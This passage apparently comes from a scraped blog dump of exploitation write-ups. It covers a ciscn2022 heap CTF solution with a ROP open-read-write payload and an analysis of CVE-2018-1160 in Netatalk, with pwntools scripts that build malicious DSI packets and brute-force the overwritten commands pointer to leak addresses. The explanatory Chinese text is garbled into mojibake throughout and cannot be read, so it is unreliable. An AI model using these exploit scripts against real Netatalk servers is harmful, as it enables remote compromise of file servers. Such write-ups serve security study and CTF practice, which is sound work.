libc.sym['read']\nwrite_ = libc_base + libc.sym['write']\n# inf(open_);inf(read_);inf(write_)\npop_rdi = libc_base + 0x0000000000028a55\npop_rsi = libc_base + 0x000000000002a4cf\npop_rdx = libc_base + 0x00000000000c7f32\nheap2 = heap_base + 0x4c0\nheap3 = heap_base + 0x5d0\nedit(3,0x8,b'./flag\\x00\\x00')\npayload = p64(0)*3\npayload += p64(pop_rdi) + p64(heap3) + p64(pop_rsi) + p64(0) +p64(open_) \\\n + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap2) +p64(pop_rdx) + p64(0x30) + p64(read_) \\\n + p64(pop_rdi) + p64(1) + p64(write_)\n\n# gdb.attach(io)\nedit(17,0x100,payload)\n```\n\n## 0x0F ciscn2022 blue\n\nglibc-2.31ï¼Œé¢˜ç›®å¼€äº†æ²™ç›’ï¼Œæä¾›ä¸€æ¬¡showï¼Œä¸€æ¬¡uafï¼Œæœ€å¤§ç”³è¯·0x90å †å—ï¼Œæœ€å¤š32ä¸ªï¼Œfreeæ­£å¸¸ã€‚é€šè¿‡æ³„éœ²environï¼Œåœ¨æ ˆä¸Šå†™orwè¯»å–flagã€‚\n\nå…ˆå¡«æ»¡tcacheï¼Œå†ä¸€ä¸ªè¿›unsortedbin1ï¼Œåˆ©ç”¨uafæ³„éœ²libcåŸºå€ã€‚è¿™é‡Œéš¾ç‚¹æ˜¯ï¼Œéœ€è¦ä¸¤å—unsortedbin1ï¼Œ2åˆå¹¶ä¸ºå¤§å—3ï¼Œä¹‹åaddå‡ºä¸€ä¸ªtcacheï¼Œç”±äºå­˜åœ¨uafï¼Œæ‰€ä»¥å¯ä»¥å†ä¸€æ¬¡free unsortedbin1ï¼ˆç”±äºå·²ç»åˆå¹¶ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡binsæ£€æŸ¥ï¼Œå­˜åœ¨double freeï¼‰ï¼Œè¿™æ ·unsortedbin1å°±è¿›å…¥äº†tcacheé“¾å°¾ï¼Œé€ æˆäº†overlapã€‚\n\n![image-20230513195947928](https://files.catbox.moe/n1pxv1.png)\n\nçº¢è‰²ä¸ºå¤§å—3ï¼Œé‡Œé¢æ˜¯unsortedbin1ï¼Œç°åœ¨å·²ç»è¢«é“¾å…¥tcacheã€‚ç”±äºshowçš„æ¬¡æ•°ç”¨å®Œï¼Œæ‰€ä»¥é€šè¿‡stdoutè¿›è¡Œæ³„éœ²ï¼Œä¹‹åä¿®æ”¹unsortedbin1çš„fdä¸º\\_IO_2_1_stdout_ï¼Œå°†flagsæ ‡å¿—æ”¹æ‰ï¼ˆç»•è¿‡æ£€æŸ¥ï¼‰ï¼Œå†å°†write_baseå’Œwrite_ptr & write_endæ”¹æˆenvironå’Œenviron + 8ï¼Œæ³„éœ²å‡ºenvironçš„å€¼ã€‚ä¹‹åç»§ç»­ä¿®æ”¹tcacheé“¾ï¼Œç”³è¯·åˆ°æ ˆä¸Šæ„é€ ropå³å¯ã€‚\n\n(tcacheè¦ä¿è¯æ•°é‡åˆæ³•)\n\n```python\nio = start()\ndef add(size,con):\n    sla(\"Choice:\",\"1\")\n    sla(\"size:\",str(size))\n    sa(\"content:\",con)\n\ndef show(idx):\n    sla(\"Choice:\",\"3\")\n    sla(\"idx:\",str(idx))\n\ndef delete(idx):\n    sla(\"Choice:\",\"2\")\n    sla(\"idx:\",str(idx))\n\ndef uaf(idx):\n    sla(\"Choice:\",\"666\")\n    sla(\"idx:\",str(idx))\n\nfor i in range(10):\n    add(0x90,'a')\nfor i in range(7):\n    delete(i)\n\nuaf(8)\nshow(8)\nlibc_base = l64() - 0x1ecbe0\ninf(libc_base)\nenviron = libc_base + libc.sym['environ']\nstdout = libc_base + libc.sym['_IO_2_1_stdout_']\n\ndelete(7)\nadd(0x90,'0')\ndelete(8)\nadd(0x80,'1')\nadd(0x80,p64(0) + p64(0xa1) + p64(stdout))\nadd(0x90,'3')\nadd(0x90, p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2)\nstack = l64() - 0x128\ninf(stack)\n\ndelete(3)\ndelete(2)\nadd(0x80,p64(0) + p64(0xa1) + p64(stack))\nadd(0x90,'b')\n\nopen_ = libc_base + libc.sym['open']\nread_ = libc_base + libc.sym['read']\nwrite_ = libc_base + libc.sym['write']\n# inf(open_);inf(read_);inf(write_)\npop_rdi = libc_base + 0x0000000000023b6a\npop_rsi = libc_base + 0x000000000002601f\npop_rdx = libc_base + 0x0000000000142c92\nflag = stack\naddr = stack + 0x100\n\npayload = b'./flag\\x00\\x00'\npayload += p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(0) +p64(open_) \\\n + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(addr) +p64(pop_rdx) + p64(0x30) + p64(read_) \\\n + p64(pop_rdi) + p64(1) + p64(write_)\n\nadd(0x90,payload)\n\n# gdb.attach(io,'b *$rebase(0x004080)')\nia()\n```\n\n","tags":["CTF","wp"],"categories":["PWN"]},{"title":"å…³äºNETATALKçš„ä¸€ä¸ªè€BUG","url":"/2022/01/07/CVE-2018-1160/","content":"\n# 0x00 å‰è¨€\n\nä»Šå¤©çœ‹åˆ°ä¸€ä¸ªå¾ˆç»å…¸çš„cveï¼Œé¡ºä¾¿å†™ä¸€ç¯‡åšå®¢\næ¼æ´æ˜¯åˆ©ç”¨memcpyé•¿åº¦æ²¡é™åˆ¶å¯¼è‡´çš„è¶Šç•Œå†™ï¼Œå¯è¦†ç›–å…³é”®å˜é‡ï¼Œå¯¼è‡´æœ‰ä¸€æ¬¡ä»»æ„åœ°å€å†™\n\nåŸæ–‡ï¼š[Exploiting an 18 Year Old Bug](https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172)\n\næºç ï¼š[Netatalk3.1.11](https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11)\n\n# 0x01 æºç \n\nä¸ºäº†è°ƒè¯•æ–¹ä¾¿ç›´æ¥ä¸‹è½½å¥½äºŒè¿›åˆ¶ã€é…ç½®æ–‡ä»¶ã€è¿è¡Œåº“ï¼Œè¿™æ ·å°±æ— éœ€è‡ªå·±ç¼–è¯‘å’Œå®‰è£…ä¾èµ–æ€§\næˆ‘çš„æœ¬åœ°æ˜¯Ubuntu18.04ï¼Œé…ç½®æ–‡ä»¶ï¼š\n\n```tex\n[Global]\nafp port = 5566\ndisconnect time = 0\nmax connections = 1000\nsleep time = 0\n```\n\n`Netatalk`æ˜¯AppleTalkçš„å¼€æºå®ç°æ–¹æ¡ˆï¼Œå¯ä»¥ç”¨ä½œæ–‡ä»¶æœåŠ¡å™¨æ¥å®ç°æ–‡ä»¶å…±äº«ï¼Œafpdæ˜¯å…¶ä¸­çš„ä¸€ä¸ªç»„ä»¶ï¼Œç±»ä¼¼äºhttpdçš„æ‹¿æ¥åšé€šä¿¡çš„éƒ¨åˆ†ï¼Œæºç ç›®å½•çš„`./etc/afpd`å­ç›®å½•ä¸ºç›¸å…³æºç æ ‘ã€‚\n\nçœ‹ä¸€äº›å…³é”®å‡½æ•°ï¼š\n**dsi_tcp_open()**\n\nè¯¥å‡½æ•°é¦–å…ˆä¼šè°ƒç”¨fork()å‡½æ•°å»ºç«‹æ–°çš„å­è¿›ç¨‹ï¼Œå¹¶åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œå¦‚ä¸‹é€»è¾‘ï¼šå…ˆä»TCPä¼šè¯ä¸­è¯»å–DSI headeråˆ°ç»“æ„ä½“dsi->headerï¼Œä¹‹åè¯»å–DSI payloadå†…å®¹æ”¾åœ¨dsi->commandsæŒ‡å‘çš„bufä¸­ã€‚\n\n```c\nstatic pid_t dsi_tcp_open(DSI *dsi)\n{\n    pid_t pid;\n    SOCKLEN_T len;\n\n    len = sizeof(dsi->client);\n    dsi->socket = accept(dsi->serversock, (struct sockaddr *) &dsi->client, &len);\n\n    ......\n\n    if (dsi->socket < 0)\n        return -1;\n\n    getitimer(ITIMER_PROF, &itimer);\n    /* å»ºç«‹å­è¿›ç¨‹ */\n    if (0 == (pid = fork()) ) { /* child */\n        static struct itimerval timer = { {0, 0}, {DSI_TCPTIMEOUT, 0}};\n        struct sigaction newact, oldact;\n        uint8_t block[DSI_BLOCKSIZ];\n        size_t stored;\n    \n    ......\n\n        dsi_init_buffer(dsi);\n\n        /* read in commands. this is similar to dsi_receive except\n         * for the fact that we do some sanity checking to prevent\n         * delinquent connections from causing mischief. */\n\n        /* å…ˆè¯»ä¸¤ä¸ªå­—èŠ‚ */\n        len = dsi_stream_read(dsi, block, 2);\n        if (!len ) {\n            /* connection already closed, don't log it (normal OSX 10.3 behaviour) */\n            exit(EXITERR_CLOSED);\n        }\n        if (len < 2 || (block[0] > DSIFL_MAX) || (block[1] > DSIFUNC_MAX)) {\n            LOG(log_error, logtype_dsi, \"dsi_tcp_open: invalid header\");\n            exit(EXITERR_CLNT);\n        }\n\n        /* è¯»å–DSI headerå‰©ä¸‹å†…å®¹ */\n        stored = 2;\n        while (stored < DSI_BLOCKSIZ) {\n            len = dsi_stream_read(dsi, block + stored, sizeof(block) - stored);\n            if (len > 0)\n                stored += len;\n            else {\n                LOG(log_error, logtype_dsi, \"dsi_tcp_open: stream_read: %s\", strerror(errno));\n                exit(EXITERR_CLNT);\n            }\n        }\n\n        /* å°†DSI headerçš„å†…å®¹ä¾æ¬¡èµ‹å€¼ç»™dsi-headerç»“æ„ä½“ */\n        dsi->header.dsi_flags = block[0];\n        dsi->header.dsi_command = block[1];\n        memcpy(&dsi->header.dsi_requestID, block + 2,\n               sizeof(dsi->header.dsi_requestID));\n        memcpy(&dsi->header.dsi_data.dsi_code, block + 4, sizeof(dsi->header.dsi_data.dsi_code));\n        memcpy(&dsi->header.dsi_len, block + 8, sizeof(dsi->header.dsi_len));\n        memcpy(&dsi->header.dsi_reserved, block + 12,\n               sizeof(dsi->header.dsi_reserved));\n        dsi->clientID = ntohs(dsi->header.dsi_requestID);\n\n        /* make sure we don't over-write our buffers. */\n        dsi->cmdlen = min(ntohl(dsi->header.dsi_len), dsi->server_quantum);\n\n        /* è¯»å–payloadå†…å®¹åˆ°commandsæŒ‡é’ˆæŒ‡å‘çš„bufä¸­ */\n        stored = 0;\n        while (stored < dsi->cmdlen) {\n            len = dsi_stream_read(dsi, dsi->commands + stored, dsi->cmdlen - stored);\n            if (len > 0)\n                stored += len;\n            else {\n                LOG(log_error, logtype_dsi, \"dsi_tcp_open: stream_read: %s\", strerror(errno));\n                exit(EXITERR_CLNT);\n            }\n        }\n\n    ......\n\n    /* send back our pid */\n    return pid;\n}\n\n```\n\n**dsi_getsession()**\n\nè¯¥å‡½æ•°å¼€å¯ä¸€ä¸ªDSIä¼šè¯ï¼Œä»TCP socketæ¥æ”¶ä¼šè¯æ¶ˆæ¯ï¼Œä¿å­˜è‡³ç»“æ„ä½“DSIä¸­ã€‚ å‡½æ•°é¦–å…ˆè°ƒç”¨dsi->proto_open(dsi)è¿›è¡ŒTCPæ¶ˆæ¯çš„æ¥æ”¶å’Œå¤„ç†ï¼Œè¯¥å‡½æ•°å®ä½“ä¸ºdsi_tcp_open()ã€‚æ ¹æ®è¿”å›å€¼æ˜¯çˆ¶è¿›ç¨‹è¿˜æ˜¯å­è¿›ç¨‹ï¼Œè¿›å…¥ä¸åŒçš„å¤„ç†é€»è¾‘ã€‚çˆ¶è¿›ç¨‹åˆ™ç›´æ¥è¿”å›ï¼Œç»§ç»­ç›‘å¬ï¼Œå­è¿›ç¨‹åˆ™è¿›å…¥ä¹‹åçš„DSIæ¶ˆæ¯å¤„ç†é€»è¾‘ï¼Œæ ¹æ®dsi_commandçš„å€¼ï¼Œé€‰æ‹©ä¸åŒçš„å¤„ç†æ–¹å¼ï¼Œè‹¥dsi_commandä¸ºDSIFUNC_OPENï¼Œåˆ™è°ƒç”¨dsi_opensession()å‡½æ•°ï¼Œåˆå§‹åŒ–DSIä¼šè¯ã€‚\n\n```c\nint dsi_getsession(DSI *dsi, server_child_t *serv_children, int tickleval, afp_child_t **childp)\n{\n  ......\n\n  switch (pid = dsi->proto_open(dsi)) { /* in libatalk/dsi/dsi_tcp.c */\n  case -1:\n    /* if we fail, just return. it might work later */\n    LOG(log_error, logtype_dsi, \"dsi_getsess: %s\", strerror(errno));\n    return -1;\n\n  case 0: /* child. mostly handled below. */\n    break;\n\n  default: /* parent */\n    /* using SIGKILL is hokey, but the child might not have\n     * re-established its signal handler for SIGTERM yet. */\n\n    ......\n\n    dsi->proto_close(dsi);\n    *childp = child;\n    return 0;\n  }\n  \n  ......\n\n  switch (dsi->header.dsi_command) {\n  case DSIFUNC_STAT: /* send off status and return */\n    ......\n    \n  case DSIFUNC_OPEN: /* setup session */\n    /* set up the tickle timer */\n    dsi->timer.it_interval.tv_sec = dsi->timer.it_value.tv_sec = tickleval;\n    dsi->timer.it_interval.tv_usec = dsi->timer.it_value.tv_usec = 0;\n    dsi_opensession(dsi);\n    *childp = NULL;\n    return 0;\n\n  default: /* just close */\n    LOG(log_info, logtype_dsi, \"DSIUnknown %d\", dsi->header.dsi_command);\n    dsi->proto_close(dsi);\n    exit(EXITERR_CLNT);\n  }\n}\n```\n\n**dsi_opensession()**\n\nå‡½æ•°é¦–å…ˆæ ¹æ®commands[0]çš„å†…å®¹å†³å®šå¤„ç†é€»è¾‘ï¼Œè‹¥ä¸ºDSIOPT_ATTNQUANTï¼Œåˆ™æ‰§è¡Œmemcpyï¼Œä»¥commands[1]ä¸ºå¤§å°ï¼Œå°†commands[2]ä¹‹åçš„å†…å®¹æ‹·è´è‡³DSIç»“æ„ä½“çš„attn_quantumæˆå‘˜å˜é‡ï¼ˆ4 bytesï¼‰ã€‚ä¹‹åç¨‹åºä¼šæ„å»ºæ–°çš„DSIæ¶ˆæ¯åˆ°dsi->commandsä¸­ï¼Œå°†server_quantumçš„å€¼è¿”å›ç»™å®¢æˆ·ç«¯ã€‚\n\n```c\nvoid dsi_opensession(DSI *dsi)\n{\n  uint32_t i = 0; /* this serves double duty. it must be 4-bytes long */\n  int offs;\n\n    ......\n\n  /* parse options */\n  while (i < dsi->cmdlen) {\n    switch (dsi->commands[i++]) {\n    case DSIOPT_ATTNQUANT:\n      memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);\n      dsi->attn_quantum = ntohl(dsi->attn_quantum);\n\n    case DSIOPT_SERVQUANT: /* just ignore these */\n    default:\n      i += dsi->commands[i] + 1; /* forward past length tag + length */\n      break;\n    }\n  }\n\n  /* let the client know the server quantum. we don't use the\n   * max server quantum due to a bug in appleshare client 3.8.6. */\n  dsi->header.dsi_flags = DSIFL_REPLY;\n  dsi->header.dsi_data.dsi_code = 0;\n  /* dsi->header.dsi_command = DSIFUNC_OPEN;*/\n\n  dsi->cmdlen = 2 * (2 + sizeof(i)); /* length of data. dsi_send uses it. */\n\n  /* DSI Option Server Request Quantum */\n  dsi->commands[0] = DSIOPT_SERVQUANT;\n  dsi->commands[1] = sizeof(i);\n  i = htonl(( dsi->server_quantum < DSI_SERVQUANT_MIN || \n\t      dsi->server_quantum > DSI_SERVQUANT_MAX ) ? \n\t    DSI_SERVQUANT_DEF : dsi->server_quantum);\n  memcpy(dsi->commands + 2, &i, sizeof(i));\n\n  /* AFP replaycache size option */\n  offs = 2 + sizeof(i);\n  dsi->commands[offs] = DSIOPT_REPLCSIZE;\n  dsi->commands[offs+1] = sizeof(i);\n  i = htonl(REPLAYCACHE_SIZE);\n  memcpy(dsi->commands + offs + 2, &i, sizeof(i));\n  dsi_send(dsi);\n}\n```\n\næ¼æ´ç‚¹ä¹Ÿå°±åœ¨è¿™ä¸ªå‡½æ•°å†…ï¼Œ\n\n```c\nwhile (i < dsi->cmdlen) {\n    switch (dsi->commands[i++]) {\n    case DSIOPT_ATTNQUANT:  // #define DSIOPT_ATTNQUANT 0x01    \n      memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);\n      dsi->attn_quantum = ntohl(dsi->attn_quantum);\n```\n\nmemcpyçš„é•¿åº¦å‚æ•° dsi->commands[i] ç”±å¤–éƒ¨ä¼ å…¥ï¼Œä¸”æ²¡æ£€æŸ¥å¤§å°ï¼Œå¯¼è‡´å¯æº¢å‡ºåˆ°DSIç»“æ„ä½“ä¸­attn_quantumçš„åç»­æˆå‘˜ã€‚\n\n```c\n#define DSI_DATASIZ       65536\n\ntypedef struct DSI {\n    ...\n    uint32_t attn_quantum, datasize, server_quantum;\n    uint16_t serverID, clientID;\n    uint8_t  *commands; /* DSI recieve buffer */\n    uint8_t  data[DSI_DATASIZ];    /* DSI reply buffer */\n```\n\nä½†å¯è§æˆå‘˜ commands çš„ç±»å‹ä¸ºuint8_t*ï¼Œæ‰€ä»¥memcpyçš„æœ€å¤§é•¿åº¦æ˜¯0xffã€‚å¹¶ä¸”ç”±äº DSI_DATASIZ ä¸º65535ï¼Œæ‰€ä»¥æº¢å‡ºéƒ¨åˆ†dataåå°±æ— æ³•å‘åæº¢å‡ºäº†ï¼Œæ•…æœ€ç»ˆåªèƒ½æº¢å‡ºå¦‚ä¸Šè¿™äº›æˆå‘˜å˜é‡ã€‚\n\nåˆ©ç”¨ä¹‹å‰å…ˆææ‡‚dsiæ˜¯ä»€ä¹ˆï¼š[Data Stream Interface](https://en.wikipedia.org/wiki/Data_Stream_Interface)ï¼ŒæŒ‰ç…§åè®®æ ¼å¼å¯ä»¥æ„é€ å…¶å„ä¸ªå­—æ®µ\n\n```c\ncommands = \"\\x01\"   // DSIOPT_ATTNQUANT é€‰é¡¹çš„å€¼\ncommands += \"\\x80\"  // æ•°æ®é•¿åº¦\ncommands += \"\\xaa\" * 0x80\n```\n\näºæ˜¯æ˜ç™½ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥äº¤äº’è¯•ä¸€ä¸‹ï¼Œæ„é€ ä¸€ä¸ªdsiæ•°æ®åŒ…ï¼Œå¹¶ç»™å‘é€ç»™ç›®æ ‡çš„tcpç«¯å£(æœ¬åœ°æµ‹è¯•)ï¼Œçœ‹çœ‹èƒ½å¦è¿”å›server_quantumçš„å€¼ã€‚\n\n```python\nfrom pwn import *\ncontext(endian='big',log_level='debug')\nio = remote(\"127.0.0.1\",5566)\ncmd  = b'\\x01'+ p8(0xc)+ b'a'*8 + b'bbbb'\ndsi  = b'\\x00\\x04\\x00\\x01' #headeréƒ¨åˆ†çš„å­—æ®µæ„ä¹‰è§åŸæ–‡\ndsi += p32(0)\ndsi += p32(len(cmd)) \ndsi += p32(0)\ndsi += cmd\nio.send(dsi)\nio.recv()\n```\n\n![image-20220107153501796](https://s2.loli.net/2022/01/07/kUTm9jVOvxAr6Io.png)\n\næµ‹è¯•ç¡®å®å¯ä»¥æ”¶åˆ°bbbb\n\n![image-20220107155401775](https://s2.loli.net/2022/01/07/nRK9jcgTPFz1Ndi.png)\n\n# 0x02 æ¼æ´åˆ©ç”¨\n\næ¼æ´ç‚¹1ï¼š\n\næ¥ä¸‹æ¥å…·ä½“çœ‹ä¸€ä¸‹å†…å­˜æƒ…å†µï¼Œç»§ç»­ä½¿ç”¨ä¸Šé¢çš„è„šæœ¬ï¼Œå¯åŠ¨gdbæ‰¾åˆ°bbbb\n\n![image-20220107160010721](https://s2.loli.net/2022/01/07/xWvndjtp89eam7S.png)\n\nå¯¹åº”DSIçš„ç»“æ„ä½“ï¼Œå¯ä»¥çŸ¥é“0x00007f5f3d6c8010å³commandsï¼Œå†çœ‹ä¸€ä¸‹å†…å­˜å¸ƒå±€\n\n![img](https://s2.loli.net/2022/01/07/jh4BRb89DFCzmMJ.png)\n\nè¯¥åœ°å€å’Œlibcåœ°å€æ¯”è¾ƒç›¸è¿‘ï¼Œæ‰€ä»¥æ®µåŸºå€éƒ½æ˜¯4ké¡µå¯¹é½ï¼Œçˆ†ä¸¤ä¸ªå­—èŠ‚ï¼Œæœ€å·®65536æ¬¡å°±å¯ä»¥äº†\n\nä»ä½ä½å¼€å§‹ï¼Œä¾æ¬¡è¦†ç›–commandsæŒ‡é’ˆçš„å„ä¸ªå­—èŠ‚ã€‚å½“ä¿®æ”¹åçš„commandsæŒ‡é’ˆæ˜¯ä¸€ä¸ªå¯å†™çš„åœ°å€æ—¶ï¼Œdsi_opensession()å‡½æ•°å¯ä»¥å°†server_quantumçš„å€¼æ”¾è¿›æ¥å¹¶è¿”å›ç»™æˆ‘ä»¬ï¼Œå¦åˆ™ï¼Œå­è¿›ç¨‹ä¼šç”±äºè®¿é—®ä¸å¯å†™çš„åœ°å€è€Œå´©æºƒï¼Œsocketå¼‚å¸¸ã€‚æ•…ï¼Œå¯ä»¥é€šè¿‡è§‚å¯ŸæœåŠ¡å™¨æ˜¯å¦ç»™æˆ‘ä»¬è¿”å›æ¥ç¡®å®šå½“å‰æˆ‘ä»¬æ˜¯å¦çˆ†ç ´å‡ºä¸€ä¸ªåˆæ³•çš„åœ°å€ã€‚\n\n```python\ndef boom():\n    leak = b''\n    for j in range(8):\n        for i in range(256):\n            if(j>2 and j<6): i = 255 - i\n            io = remote(ip,port)\n            payload  = b'\\x01'+ p8(0x11+j)+ b'a'*0x10 + leak + p8(i)\n            io.send(create_dsi(payload))\n            try:\n                a = io.recv()\n                leak += p8(i)\n                log.success(str(hex(i)))\n                io.close()\n                break\n            except:\n                io.close()\n    return u64(leak)\n\nleak_addr = boom()\n```\n\nè‡³äºä¸ºä»€ä¹ˆ3-6ä½ä»0xffåˆ°0x00çˆ†æ˜¯ä¸ºäº†è®¡ç®—åç§»æ—¶æ–¹ä¾¿ä¸€ç‚¹ï¼Œç»“æœæ›´æ¥è¿‘libc_baseï¼Œä¸”åœ°å€è¾ƒé«˜\n\n![image-20220107165016414](https://s2.loli.net/2022/01/07/bH52kwvjndYIe3p.png)\n\n![image-20220107165049214](https://s2.loli.net/2022/01/07/aUCnvpiJg2L6So4.png)\n\nåœ¨æœ¬åœ°æµ‹è¯•çš„æ–¹ä¾¿ä¹‹å¤„åœ¨äºå¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ‰¾åˆ°libcåŸºå€ï¼Œå¯æ˜¯è¿œç¨‹å°±æ²¡é‚£ä¹ˆå®¹æ˜“äº†ï¼Œä¸çŸ¥é“æœºå™¨ç‰ˆæœ¬çš„æƒ…å†µè·¨å¦‚ä½•çŸ¥é“å…·ä½“åç§»å‘¢ï¼Œå¯ä»¥å…ˆåœ¨æœ¬åœ°æµ‹è¯•æ”»å‡»æ–¹æ³•ï¼Œæœ¬åœ°æˆåŠŸä¹‹åå†è¿œç¨‹çˆ†ç ´ï¼Œç›´åˆ°è¿œç¨‹æˆåŠŸä¸ºæ­¢\n\n```python\nleak_addr = 0x7f5f3d138000\nfor i in range(0x0000000,0xffff000,0x1000):\n    libc_addr = leak_addr - i \n```\n\nä¸ºäº†æ–¹ä¾¿ï¼Œæœ¬æ–‡åªåœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•ï¼Œæ‰€ä»¥å‡è®¾ç°åœ¨å·²ç»æ‹¥æœ‰äº†libcåŸºå€ï¼Œå¯ä»¥æ§åˆ¶commandsï¼Œä¸‹ä¸€æ­¥åˆ©ç”¨ä»»æ„å†™æ¼æ´ï¼Œ\n\næ¼æ´ç‚¹2ï¼š\n\n**dsi_stream_receive()**\n\nè¯¥å‡½æ•°ä»å½“å‰socketç»§ç»­è¯»å–æ¶ˆæ¯å¹¶ä¿å­˜åœ¨ç»“æ„ä½“ä¸­ã€‚å…·ä½“åœ°ï¼Œå…ˆè¯»å–DSI headerå¹¶ä¿å­˜åˆ°dsi->headerç»“æ„ä½“ä¸­ï¼Œç„¶åè¯»å–åç»­DSI payloadä¿å­˜åˆ°dsi->commandsæŒ‡å‘çš„bufferå½“ä¸­ï¼Œé•¿åº¦ç”±dsi->cmdlenæŒ‡å®šã€‚\n\n```c\nint dsi_stream_receive(DSI *dsi)\n{\n  char block[DSI_BLOCKSIZ];\n\n  LOG(log_maxdebug, logtype_dsi, \"dsi_stream_receive: START\");\n\n  if (dsi->flags & DSI_DISCONNECTED)\n      return 0;\n\n  /* read in the header */\n  if (dsi_buffered_stream_read(dsi, (uint8_t *)block, sizeof(block)) != sizeof(block)) \n    return 0;\n\n  dsi->header.dsi_flags = block[0];\n  dsi->header.dsi_command = block[1];\n\n  if (dsi->header.dsi_command == 0)\n      return 0;\n\n  memcpy(&dsi->header.dsi_requestID, block + 2, sizeof(dsi->header.dsi_requestID));\n  memcpy(&dsi->header.dsi_data.dsi_doff, block + 4, sizeof(dsi->header.dsi_data.dsi_doff));\n  dsi->header.dsi_data.dsi_doff = htonl(dsi->header.dsi_data.dsi_doff);\n  memcpy(&dsi->header.dsi_len, block + 8, sizeof(dsi->header.dsi_len));\n\n  memcpy(&dsi->header.dsi_reserved, block + 12, sizeof(dsi->header.dsi_reserved));\n  dsi->clientID = ntohs(dsi->header.dsi_requestID);\n  \n  /* make sure we don't over-write our buffers. */\n  dsi->cmdlen = MIN(ntohl(dsi->header.dsi_len), dsi->server_quantum);\n\n  /* Receiving DSIWrite data is done in AFP function, not here */\n  if (dsi->header.dsi_data.dsi_doff) {\n      LOG(log_maxdebug, logtype_dsi, \"dsi_stream_receive: write request\");\n      dsi->cmdlen = dsi->header.dsi_data.dsi_doff;\n  }\n\n  /* å°†headerä¹‹åçš„payloadè¯»å–åˆ°commandsæŒ‡å‘çš„å†…å­˜ä¸­ */\n  if (dsi_stream_read(dsi, dsi->commands, dsi->cmdlen) != dsi->cmdlen)\n    return 0;\n\n  LOG(log_debug, logtype_dsi, \"dsi_stream_receive: DSI cmdlen: %zd\", dsi->cmdlen);\n\n  return block[1];\n}\n```\n\nè°ˆä¸€ä¸‹åç»­æµç¨‹ï¼Œcommandsé€šè¿‡ä¸€ä¸ªå®šä¹‰åœ¨etc/afpd/switch.cåå«`afp_switch`çš„å…¨å±€è·³è½¬è¡¨æŒ‡é’ˆï¼ˆæŒ‡å‘å…·æœ‰255ä¸ªé¡¹çš„è·³è½¬è¡¨ï¼‰æ¥åœ¨ç³»ç»Ÿä¸­ä¼ é€’ã€‚è·³è½¬è¡¨ä¸­æ¯ä¸€ä¸ªé¡¹è¦ä¹ˆæ˜¯NULLï¼ˆè¡¨ç¤ºæ²¡æœ‰å®ç°ï¼‰ï¼Œè¦ä¹ˆæ˜¯ä¸€ä¸ªå‡½æ•°ï¼ˆç”¨äºå¤„ç†`commands`é‡Œçš„AFPæ•°æ®ï¼‰ã€‚\n\nè¯»å–å®Œæ¯•åè‹¥`cmd=2(DSIFUNC_CMD)`ï¼Œåˆ™ä»¥`dsi->commands[0]`ä¸ºç´¢å¼•ï¼Œ`err = (*afp_switch[function])(obj,(char *)dsi->commands, dsi->cmdlen,(char *)&dsi->data, &dsi->datalen);`ï¼Œè°ƒç”¨afp_switchå‡½æ•°è¡¨çš„æŒ‡é’ˆã€‚\n\n```c\nfunction = (u_char) dsi->commands[0];\nif (afp_switch[function]) {\n    err = (*afp_switch[function])(obj,\n            (char *)dsi->commands, dsi->cmdlen,\n            (char *)&dsi->data, &dsi->datalen);\n} else {\n    LOG(log_maxdebug, logtype_afpd, \"bad function %X\", function);\n    dsi->datalen = 0;\n    err = AFPERR_NOOP;\n}\n```\n\n`afp_switch`æŒ‡å‘ä¸¤ç§è·³è½¬è¡¨ä¸­çš„ä¸€ä¸ªã€‚ä¸€ä¸ªåå«`preauth_switch`ï¼Œå®ƒåŒ…å«äº†æœªè®¤è¯ç”¨æˆ·ä»…èƒ½è°ƒç”¨çš„å››ä¸ªå‡½æ•°ï¼Œ`preauth_switch`ä¹Ÿæ˜¯é»˜è®¤çš„`afp_switch`è¡¨ã€‚å¦ä¸€ä¸ªåå«`postauth_switch`ï¼Œå½“ç”¨æˆ·è¿›è¡Œè®¤è¯åï¼Œå®ƒè¢«æ¢å…¥åˆ°`afp_switch`ä¸­ã€‚\n\nè¿™é‡Œçš„ç»“æ„æ˜¯è¿™æ ·çš„\n\n```c\nAFPCmd *afp_switch = preauth_switch;\n\nAFPCmd postauth_switch[] = {\n    NULL, afp_bytelock, afp_closevol, afp_closedir,\n    afp_closefork, afp_copyfile, afp_createdir, afp_createfile,\t/*   0 -   7 */\n    afp_delete, afp_enumerate, afp_flush, afp_flushfork,\n    afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo,\t/*   8 -  15 */\n    afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont,\n    afp_logout, afp_mapid, afp_mapname, afp_moveandrename,\t/*  16 -  23 */\n    afp_openvol, afp_opendir, afp_openfork, afp_read,\n    afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams,\n    /*  24 -  31 */\n    afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams,\n    afp_changepw, afp_getuserinfo, afp_getsrvrmesg, afp_createid, /*  32 -  39 */\n    afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch,\n    afp_null, afp_null, afp_null, afp_null,\t\t\t/*  40 -  47 */\n    afp_opendt, afp_closedt, afp_null, afp_geticon,\n    afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl,\t/*  48 -  55 */\n    afp_addcomment, afp_rmvcomment, afp_getcomment, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/*  56 -  63 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/*  64 -  71 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, afp_syncdir, afp_syncfork,\t/*  72 -  79 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/*  80 -  87 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/*  88 -  95 */\n    NULL, NULL, NULL, 